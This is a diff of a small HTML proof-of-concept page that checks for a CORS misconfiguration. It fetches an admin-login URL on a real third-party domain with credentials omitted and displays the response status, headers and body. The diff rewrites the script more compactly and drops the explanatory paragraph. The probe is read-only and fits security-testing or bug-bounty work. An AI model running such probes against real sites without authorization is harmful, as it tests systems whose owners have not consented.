@@ -1,31 +1,26 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"/><title>CORS PoC (no credentials)</title></head>
+<head><meta charset="utf-8"><title>CORS PoC (no credentials)</title></head>
 <body>
-  <h2>CORS PoC — read-only (no credentials)</h2>
-  <p>This demonstrates a safe PoC: it <strong>omits credentials</strong> so browser allows reading when server returns ACAO: *</p>
+  <h3>CORS PoC (no credentials)</h3>
   <button id="run">Run fetch</button>
-  <pre id="out">Idle</pre>
-<script>
-document.getElementById('run').addEventListener('click', ()=>{
-  const out = document.getElementById('out');
-  out.textContent = 'Fetching...';
-  fetch("https://go.capital.com/v2/login/admin-login/", {
-    method: "GET",
-    credentials: "omit" // IMPORTANT: omit credentials to avoid credential-blocking
-  })
-  .then(r=>{
-    out.textContent = 'Status: ' + r.status + '\\n\\nHeaders:\\n';
-    for(const h of r.headers) out.textContent += h[0]+': '+h[1] + '\\n';
-    return r.text();
-  })
-  .then(body=>{
-    out.textContent += '\\nBody (first 3000 chars):\\n' + body.slice(0,3000)
-  })
-  .catch(e=>{
-    out.textContent = 'Failed: ' + e;
-  });
-});
-</script>
+  <pre id="out"></pre>
+  <script>
+    document.getElementById('run').onclick = async () => {
+      try {
+        const res = await fetch('https://go.capital.com/v2/login/admin-login/', {
+          method: 'GET',
+          credentials: 'omit' // <-- لا ترسل credentials
+        });
+        const text = await res.text();
+        document.getElementById('out').textContent =
+          'Status: ' + res.status + '\\n\\nHeaders:\\n' +
+          [...res.headers].map(h => h.join(': ')).join('\\n') +
+          '\\n\\nBody (first 200 chars):\\n' + text.slice(0,200);
+      } catch (e) {
+        document.getElementById('out').textContent = 'Error: ' + e;
+      }
+    };
+  </script>
 </body>
 </html>
